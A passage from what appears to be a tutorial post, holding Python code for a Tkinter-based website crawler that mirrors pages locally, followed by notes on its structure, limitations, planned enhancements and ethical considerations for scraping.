figure.decompose()                # Rewrite links to point to local files                for anchor in soup.find_all('a', href=True):                    href = anchor['href']                    absolute_url = urljoin(url, href)                    if absolute_url in self.visited_urls:                        # Convert the absolute URL to a local path                        local_path = self.clean_filename(absolute_url)                        # Make the path relative to the current file                        current_depth = len(os.path.dirname(filename).split(os.sep))                        relative_path = os.path.relpath(local_path, os.path.dirname(filename))                        anchor['href'] = relative_path                        print(f\"Rewriting link: {href} -&gt; {relative_path}\")                # Create subdirectories if needed                os.makedirs(os.path.dirname(filepath), exist_ok=True)                print(f\"Directory structure created/verified\")                # Save the modified HTML                with open(filepath, 'w', encoding='utf-8') as f:                    f.write(str(soup))                print(f\"Successfully saved modified HTML to {filename}\")            except Exception as e:                print(f\"Error saving {filename}: {str(e)}\")                print(f\"Full path attempted: {os.path.abspath(filepath)}\")    def extract_links(self, content, url):        \"\"\"Extract all valid links from a webpage.\"\"\"        soup = BeautifulSoup(content, 'html.parser')        links = set()        print(f\"\\nExtracting links from {url}\")        link_count = 0        for anchor in soup.find_all('a', href=True):            link = urljoin(url, anchor['href'])            if self.is_valid_url(link):                links.add(link)                link_count += 1        print(f\"Found {link_count} valid links on this page\")        return links    def crawl(self):        \"\"\"Start the crawling process.\"\"\"        # Reset stop flag        self.stop_requested = False        # Queue now contains tuples of (url, depth)        queue = [(self.base_url, 0)]        pages_processed = 0        start_time = time.time()        print(f\"\\nStarting crawl of {self.base_url}\")        print(f\"Maximum depth: {self.max_depth}\")        while queue and not self.stop_requested:            url, depth = queue.pop(0)            if url in self.visited_urls or depth &gt;= self.max_depth:                continue            pages_processed += 1            print(f\"\\n--- Processing page {pages_processed} ---\")            print(f\"URL: {url}\")            print(f\"Depth: {depth}/{self.max_depth}\")            print(f\"Queue size: {len(queue)}\")            self.visited_urls.add(url)            # Download the page            content = self.download_page(url)            if content:                # Save the page                self.save_page(content, url)                # Only add new links if we haven't reached max_depth                if depth &lt; self.max_depth - 1:                    # Extract and add new links to the queue with incremented depth                    new_links = self.extract_links(content, url)                    queue.extend([(link, depth + 1) for link in new_links if link not in self.visited_urls])                # Rate limiting                if queue and not self.stop_requested:                    print(f\"Waiting {self.rate_limit} seconds before next page...\")                    time.sleep(self.rate_limit)        elapsed_time = time.time() - start_time        print(f\"\\nCrawling completed!\")        if self.stop_requested:            print(\"Crawling was stopped by user\")        print(f\"Total pages processed: {pages_processed}\")        print(f\"Total unique URLs visited: {len(self.visited_urls)}\")        print(f\"Total time: {elapsed_time:.2f} seconds\")class WebCrawlerGUI:    def __init__(self, root):        self.root = root        self.root.title(\"Web Crawler\")        self.root.geometry(\"600x500\")        self.crawler = None  # Initialize crawler reference        # Create main frame        main_frame = ttk.Frame(root, padding=\"10\")        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))        # URL input        ttk.Label(main_frame, text=\"URL to crawl:\").grid(row=0, column=0, sticky=tk.W, pady=5)        self.url_var = tk.StringVar()        self.url_entry = ttk.Entry(main_frame, textvariable=self.url_var, width=50)        self.url_entry.grid(row=0, column=1, columnspan=2, sticky=(tk.W, tk.E), pady=5)        # Output directory        ttk.Label(main_frame, text=\"Output directory:\").grid(row=1, column=0, sticky=tk.W, pady=5)        self.output_var = tk.StringVar(value=os.path.join(os.getcwd(), \"downloaded_site\"))        self.output_entry = ttk.Entry(main_frame, textvariable=self.output_var, width=50)        self.output_entry.grid(row=1, column=1, sticky=(tk.W, tk.E), pady=5)        ttk.Button(main_frame, text=\"Browse\", command=self.browse_output).grid(row=1, column=2, sticky=tk.W, pady=5,                                                                               padx=5)        # Depth input        ttk.Label(main_frame, text=\"Maximum depth:\").grid(row=2, column=0, sticky=tk.W, pady=5)        self.depth_var = tk.StringVar(value=\"3\")        depth_entry = ttk.Entry(main_frame, textvariable=self.depth_var, width=10)        depth_entry.grid(row=2, column=1, sticky=tk.W, pady=5)        # Progress frame        progress_frame = ttk.LabelFrame(main_frame, text=\"Progress\", padding=\"5\")        progress_frame.grid(row=3, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=10)        # Progress bar        self.progress_var = tk.StringVar(value=\"Ready\")        ttk.Label(progress_frame, textvariable=self.progress_var).grid(row=0, column=0, sticky=tk.W)        # Log text area        self.log_text = tk.Text(main_frame, height=15, width=60, wrap=tk.WORD)        self.log_text.grid(row=4, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=5)        # Scrollbar for log        scrollbar = ttk.Scrollbar(main_frame, orient=tk.VERTICAL, command=self.log_text.yview)        scrollbar.grid(row=4, column=3, sticky=(tk.N, tk.S))        self.log_text.configure(yscrollcommand=scrollbar.set)        # Buttons frame        button_frame = ttk.Frame(main_frame)        button_frame.grid(row=5, column=0, columnspan=3, pady=10)        # Start button        self.start_button = ttk.Button(button_frame, text=\"Start Crawling\", command=self.start_crawling)        self.start_button.pack(side=tk.LEFT, padx=5)        # Stop button (initially disabled)        self.stop_button = ttk.Button(button_frame, text=\"Stop\", command=self.stop_crawling, state='disabled')        self.stop_button.pack(side=tk.LEFT, padx=5)        # Configure grid weights        main_frame.columnconfigure(1, weight=1)        # Redirect stdout to our log        sys.stdout = self    def write(self, text):        \"\"\"Handle stdout redirection\"\"\"        self.log_text.insert(tk.END, text)        self.log_text.see(tk.END)        self.root.update_idletasks()    def flush(self):        \"\"\"Required for stdout redirection\"\"\"        pass    def browse_output(self):        \"\"\"Open directory browser\"\"\"        directory = filedialog.askdirectory(initialdir=self.output_var.get())        if directory:            self.output_var.set(directory)    def stop_crawling(self):        \"\"\"Stop the crawling process\"\"\"        self.stop_button.configure(state='disabled')        self.progress_var.set(\"Stopping...\")        self.crawler.stop()  # Request the crawler to stop    def start_crawling(self):        \"\"\"Start the crawling process\"\"\"        # Validate inputs        url = self.url_var.get().strip()        output_dir = self.output_var.get().strip()        try:            depth = int(self.depth_var.get())            if depth &lt; 1:                raise ValueError(\"Depth must be at least 1\")        except ValueError as e:            messagebox.showerror(\"Error\", \"Invalid depth value. Please enter a positive number.\")            return        if not url:            messagebox.showerror(\"Error\", \"Please enter a URL\")            return        if not url.startswith(('http://', 'https://')):            messagebox.showerror(\"Error\", \"URL must start with http:// or https://\")            return        # Disable inputs while crawling        self.start_button.configure(state='disabled')        self.url_entry.configure(state='disabled')        self.output_entry.configure(state='disabled')        self.progress_var.set(\"Crawling...\")        # Clear log        self.log_text.delete(1.0, tk.END)        # Start crawling in a separate thread        def crawl_thread():            try:                self.crawler = WebsiteCrawler(url, output_dir, depth)                self.stop_button.configure(state='normal')  # Enable stop button                self.crawler.crawl()                if self.crawler.stop_requested:                    self.root.after(0, self.crawling_finished, True, \"Crawling stopped by user\")                else:                    self.root.after(0, self.crawling_finished, True)            except Exception as e:                self.root.after(0, self.crawling_finished, False, str(e))        threading.Thread(target=crawl_thread, daemon=True).start()    def crawling_finished(self, success, error_message=None):        \"\"\"Called when crawling is complete\"\"\"        # Re-enable inputs        self.start_button.configure(state='normal')        self.url_entry.configure(state='normal')        self.output_entry.configure(state='normal')        # Disable stop button        self.stop_button.configure(state='disabled')        if success:            if error_message and \"stopped by user\" in error_message:                self.progress_var.set(\"Crawling stopped\")                messagebox.showinfo(\"Stopped\", \"Website crawling was stopped by user\")            else:                self.progress_var.set(\"Crawling completed!\")                messagebox.showinfo(\"Success\", \"Website crawling completed successfully!\")        else:            self.progress_var.set(\"Error occurred!\")            messagebox.showerror(\"Error\", f\"An error occurred while crawling:\\n{error_message}\")def main():    root = tk.Tk()    app = WebCrawlerGUI(root)    root.mainloop()if __name__ == \"__main__\":    main()Code StructureKey Components  WebsiteCrawler Class: Handles the core crawling logic, including URL validation, content downloading, and link extraction.  WebCrawlerGUI Class: Manages the GUI components and threading for a responsive interface.  Main Function: Initializes the GUI and starts the application.Method Overviewgraph TD    A[Start Crawling] --&gt; B{Validate Inputs}    B --&gt;|Valid| C[Initialize Crawler]    C --&gt; D[Crawl Base URL]    D --&gt; E[Process Queue]    E --&gt; F[Download Page]    F --&gt; G[Save Content]    G --&gt; H[Extract Links]    H --&gt; I[Add to Queue]    I --&gt; J{More Pages?}    J --&gt;|Yes| E    J --&gt;|No| K[Finish]OutputLimitations  JavaScript Content: Cannot render or scrape JavaScript-generated content.  Dynamic Websites: May miss content loaded asynchronously.  Authentication: Doesn’t handle password-protected pages.  Robots.txt: Doesn’t respect website’s robots.txt policies.  Large Sites: Not optimized for very large websites (&gt;1000 pages).Future Enhancements  Add support for sitemap.xml parsing.  Implement concurrent requests with thread pooling.  Add CSS/JavaScript file downloading.  Create sitemap visualization.  Add proxy support for distributed crawling.  Respect robots.txt rules.  Add support for handling cookies and sessions.  Implement a retry mechanism for failed requests.Ethical Considerations  Always check the website’s Terms of Service before scraping.  Add robots.txt checking (currently not implemented).  Implement rate limiting to avoid server overload.  Consider adding Referrer-Policy and User-Agent headers.  Never scrape personal or sensitive information.  Use the tool responsibly and for educational purposes only."
  }
  
]

